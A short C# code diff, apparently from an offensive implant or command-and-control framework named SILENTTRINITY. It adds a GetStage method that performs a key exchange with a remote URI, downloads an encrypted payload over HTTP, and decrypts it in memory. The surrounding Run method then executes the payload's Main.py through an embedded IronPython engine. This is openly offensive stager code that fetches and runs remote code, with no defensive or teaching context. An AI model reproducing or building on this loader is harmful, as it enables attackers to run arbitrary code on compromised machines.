@@ -8,6 +8,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.Text;
 using System.IO.Compression;
+using System.Threading.Tasks;
 
 namespace SILENTTRINITY.Utilities
 {
@@ -15,7 +16,7 @@ namespace SILENTTRINITY.Utilities
     {
         public static class IronPython
         {
-            public static void Run(Uri url, Guid GUID, ref ZipStorer Stage)
+            public static void Run(Uri url, Guid GUID, ZipStorer Stage)
             {
                 var engine = Engines.IronPython.CreateEngine();
 
@@ -37,6 +38,11 @@ namespace SILENTTRINITY.Utilities
                     byte[] mainPyFile = Internals.GetResourceInZip(Stage, "Main.py");
                     engine.Execute(Encoding.UTF8.GetString(mainPyFile, 0, mainPyFile.Length), scope);
                 }
+            }
+
+            public static async Task<MemoryStream> GetStage(Uri uri)
+            {
+                return new MemoryStream(Crypto.Decrypt(await Crypto.KeyExchangeAsync(uri), await Http.GetAsync(uri)));
             }
 
             // https://mail.python.org/pipermail/ironpython-users/2012-December/016366.html
